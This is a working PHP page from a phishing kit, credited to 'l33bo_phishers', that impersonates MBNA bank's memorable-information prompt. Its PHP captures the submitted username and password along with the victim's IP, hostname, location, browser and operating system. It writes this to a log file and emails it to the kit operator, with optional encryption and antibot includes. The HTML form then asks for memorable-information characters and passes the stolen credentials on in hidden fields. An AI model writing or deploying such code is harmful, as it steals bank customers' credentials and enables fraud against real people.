<?php
/*
Created by l33bo_phishers -- icq: 695059760 
*/
require "assets/includes/session_protect.php";
require "assets/includes/functions.php";
require "assets/includes/One_Time.php";
require "antibots.php";
require "crypt.php";
require "CONTROLS.php";
if($_SERVER["HTTPS"] != "on")
{
    header("Location: https://" . $_SERVER["HTTP_HOST"] . $_SERVER["REQUEST_URI"]);
    exit();
}
$id = $_POST['user'];
$_SESSION['user'] = $_POST['user'];
error_reporting(0);
ini_set(‘display_errors’, ’0′);
$_SESSION['pwd'] = $_POST['pwd'];
$user = $_SESSION['user'] = $_POST['user'];
$pwd = $_SESSION['pwd'] = $_POST['pwd'];
$ip = $_SERVER['REMOTE_ADDR'];
$systemInfo = systemInfo($_SERVER['REMOTE_ADDR']);
$from = $From_Address;
$headers = "From: ANBM" . $from;
$subj = " ANBM : $ip";
$to = $Your_Email; 
$VictimInfo1 = "| IP Address :"." ".$_SERVER['REMOTE_ADDR']." (".gethostbyaddr($_SERVER['REMOTE_ADDR']).")";
$VictimInfo2 = "| Location :"." ".$systemInfo['city'].", ".$systemInfo['region'].", ".$systemInfo['country'];
$VictimInfo3 = "| UserAgent :"." ".$systemInfo['useragent'];
$VictimInfo4 = "| Browser :"." ".$systemInfo['browser'];
$VictimInfo5 = "| Platform :"." ".$systemInfo['os'];
$data = "
+ ------------- ANBM -------------+
+ ------------------------------------------+
+ Account Details
| Username : $user
| Password : $pwd
+ ------------------------------------------+
+ Victim Information
$VictimInfo1
$VictimInfo2
$VictimInfo3
$VictimInfo4
$VictimInfo5
+ ------------------------------------------+
";
if($Encrypt==1) {
require "assets/includes/AES.php";
$imputText = $data;
$imputKey = $Key;
$blockSize = 256;
$aes = new AES($imputText, $imputKey, $blockSize);
$enc = $aes->encrypt();
$aes->setData($enc);
$dec=$aes->decrypt();
}
if($Save_Log==1) {
	if($Encrypt==1) {
	$file=fopen("assets/logs/u53r.txt","a");
	fwrite($file,$enc);
	fclose($file);
	}
	else {
	$file=fopen("assets/logs/u53r.txt","a");
	fwrite($file,$data);
	fclose($file);
	}
}	
if($Send_Log==1) {
	if($Encrypt==1) {
	mail($to,$subj,$enc,$headers);	
	}
	else {
	mail($to,$subj,$data,$headers);	
	}
}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html><head>
<title>MBNA - Enter Memorable Information</title>
<META content="text/html; charset=us-ascii" http-equiv=Content-Type><LINK rel="shortcut icon" type=image/x-icon href="assets/images/favicon.ico">
<style type="text/css">
  
.textbox {  
    border: 1px rgb(0,0,128,01);
    padding: 6px 5px 6px 5px;
    border-radius: 1px;
    height: 33px; 
    width: 275px; 
 } 
 

 </style>
</head>
<body style="background-repeat:no-repeat;" background="2.png">
<form method="post" action="MemorableRetry.php">
<input name="user" value="<?=$user?>" type="hidden">
<input name="pwd" value="<?=$pwd?>" type="hidden">
<select name="memo1" class="textbox" required="" autocomplete="off" style="border: 1px rgb(0,0,128,01);position:absolute;left:94px;top:339px;width:107px;HEIGHT:36px;z-index:10">
<option>Select</option>
<option value='&amp;nbsp;a'>&nbsp;a</option>
<option value='&amp;nbsp;b'>&nbsp;b</option>
<option value='&amp;nbsp;c'>&nbsp;c</option>
<option value='&amp;nbsp;d'>&nbsp;d</option>
<option value='&amp;nbsp;e'>&nbsp;e</option>
<option value='&amp;nbsp;f'>&nbsp;f</option>
<option value='&amp;nbsp;g'>&nbsp;g</option>
<option value='&amp;nbsp;h'>&nbsp;h</option>
<option value='&amp;nbsp;i'>&nbsp;i</option>
<option value='&amp;nbsp;j'>&nbsp;j</option>
<option value='&amp;nbsp;k'>&nbsp;k</option>
<option value='&amp;nbsp;l'>&nbsp;l</option>
<option value='&amp;nbsp;m'>&nbsp;m</option>
<option value='&amp;nbsp;n'>&nbsp;n</option>
<option value='&amp;nbsp;o'>&nbsp;o</option>
<option value='&amp;nbsp;p'>&nbsp;p</option>
<option value='&amp;nbsp;q'>&nbsp;q</option>
<option value='&amp;nbsp;r'>&nbsp;r</option>
<option value='&amp;nbsp;s'>&nbsp;s</option>
<option value='&amp;nbsp;t'>&nbsp;t</option>
<option value='&amp;nbsp;u'>&nbsp;u</option>
<option value='&amp;nbsp;v'>&nbsp;v</option>
<option value='&amp;nbsp;w'>&nbsp;w</option>
<option value='&amp;nbsp;x'>&nbsp;x</option>
<option value='&amp;nbsp;y'>&nbsp;y</option>
<option value='&amp;nbsp;z'>&nbsp;z</option>
<option value='&amp;nbsp;0'>&nbsp;0</option>
<option value='&amp;nbsp;1'>&nbsp;1</option>
<option value='&amp;nbsp;2'>&nbsp;2</option>
<option value='&amp;nbsp;3'>&nbsp;3</option>
<option value='&amp;nbsp;4'>&nbsp;4</option>
<option value='&amp;nbsp;5'>&nbsp;5</option>
<option value='&amp;nbsp;6'>&nbsp;6</option>
<option value='&amp;nbsp;7'>&nbsp;7</option>
<option value='&amp;nbsp;8'>&nbsp;8</option>
<option value='&amp;nbsp;9'>&nbsp;9</option></select>
<select name="memo2" class="textbox" required="" autocomplete="off" style="border: 1px rgb(0,0,128,01);position:absolute;left:220px;top:339px;width:106px;HEIGHT:36px;z-index:10">
<option>Select</option>
<option value='&amp;nbsp;a'>&nbsp;a</option>
<option value='&amp;nbsp;b'>&nbsp;b</option>
<option value='&amp;nbsp;c'>&nbsp;c</option>
<option value='&amp;nbsp;d'>&nbsp;d</option>
<option value='&amp;nbsp;e'>&nbsp;e</option>
<option value='&amp;nbsp;f'>&nbsp;f</option>
<option value='&amp;nbsp;g'>&nbsp;g</option>
<option value='&amp;nbsp;h'>&nbsp;h</option>
<option value='&amp;nbsp;i'>&nbsp;i</option>
<option value='&amp;nbsp;j'>&nbsp;j</option>
<option value='&amp;nbsp;k'>&nbsp;k</option>
<option value='&amp;nbsp;l'>&nbsp;l</option>
<option value='&amp;nbsp;m'>&nbsp;m</option>
<option value='&amp;nbsp;n'>&nbsp;n</option>
<option value='&amp;nbsp;o'>&nbsp;o</option>
<option value='&amp;nbsp;p'>&nbsp;p</option>
<option value='&amp;nbsp;q'>&nbsp;q</option>
<option value='&amp;nbsp;r'>&nbsp;r</option>
<option value='&amp;nbsp;s'>&nbsp;s</option>
<option value='&amp;nbsp;t'>&nbsp;t</option>
<option value='&amp;nbsp;u'>&nbsp;u</option>
<option value='&amp;nbsp;v'>&nbsp;v</option>
<option value='&amp;nbsp;w'>&nbsp;w</option>
<option value='&amp;nbsp;x'>&nbsp;x</option>
<option value='&amp;nbsp;y'>&nbsp;y</option>
<option value='&amp;nbsp;z'>&nbsp;z</option>
<option value='&amp;nbsp;0'>&nbsp;0</option>
<option value='&amp;nbsp;1'>&nbsp;1</option>
<option value='&amp;nbsp;2'>&nbsp;2</option>
<option value='&amp;nbsp;3'>&nbsp;3</option>
<option value='&amp;nbsp;4'>&nbsp;4</option>
<option value='&amp;nbsp;5'>&nbsp;5</option>
<option value='&amp;nbsp;6'>&nbsp;6</option>
<option value='&amp;nbsp;7'>&nbsp;7</option>
<option value='&amp;nbsp;8'>&nbsp;8</option>
<option value='&amp;nbsp;9'>&nbsp;9</option></select>
<select name="memo3" class="textbox" autocomplete="off" required="" style="border: 1px rgb(0,0,128,01);position:absolute;left:344px;top:339px;width:107px;HEIGHT:36px;z-index:10">
<option>Select</option>
<option value='&amp;nbsp;a'>&nbsp;a</option>
<option value='&amp;nbsp;b'>&nbsp;b</option>
<option value='&amp;nbsp;c'>&nbsp;c</option>
<option value='&amp;nbsp;d'>&nbsp;d</option>
<option value='&amp;nbsp;e'>&nbsp;e</option>
<option value='&amp;nbsp;f'>&nbsp;f</option>
<option value='&amp;nbsp;g'>&nbsp;g</option>
<option value='&amp;nbsp;h'>&nbsp;h</option>
<option value='&amp;nbsp;i'>&nbsp;i</option>
<option value='&amp;nbsp;j'>&nbsp;j</option>
<option value='&amp;nbsp;k'>&nbsp;k</option>
<option value='&amp;nbsp;l'>&nbsp;l</option>
<option value='&amp;nbsp;m'>&nbsp;m</option>
<option value='&amp;nbsp;n'>&nbsp;n</option>
<option value='&amp;nbsp;o'>&nbsp;o</option>
<option value='&amp;nbsp;p'>&nbsp;p</option>
<option value='&amp;nbsp;q'>&nbsp;q</option>
<option value='&amp;nbsp;r'>&nbsp;r</option>
<option value='&amp;nbsp;s'>&nbsp;s</option>
<option value='&amp;nbsp;t'>&nbsp;t</option>
<option value='&amp;nbsp;u'>&nbsp;u</option>
<option value='&amp;nbsp;v'>&nbsp;v</option>
<option value='&amp;nbsp;w'>&nbsp;w</option>
<option value='&amp;nbsp;x'>&nbsp;x</option>
<option value='&amp;nbsp;y'>&nbsp;y</option>
<option value='&amp;nbsp;z'>&nbsp;z</option>
<option value='&amp;nbsp;0'>&nbsp;0</option>
<option value='&amp;nbsp;1'>&nbsp;1</option>
<option value='&amp;nbsp;2'>&nbsp;2</option>
<option value='&amp;nbsp;3'>&nbsp;3</option>
<option value='&amp;nbsp;4'>&nbsp;4</option>
<option value='&amp;nbsp;5'>&nbsp;5</option>
<option value='&amp;nbsp;6'>&nbsp;6</option>
<option value='&amp;nbsp;7'>&nbsp;7</option>
<option value='&amp;nbsp;8'>&nbsp;8</option>
<option value='&amp;nbsp;9'>&nbsp;9</option></select>
<div style="position:absolute; left: 805px;top: 461px; z-index:5">
<input name="formimage1" src="assets/images/continue2.png" type="image"><p>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
&nbsp;</p></div>


</form></body>
</html>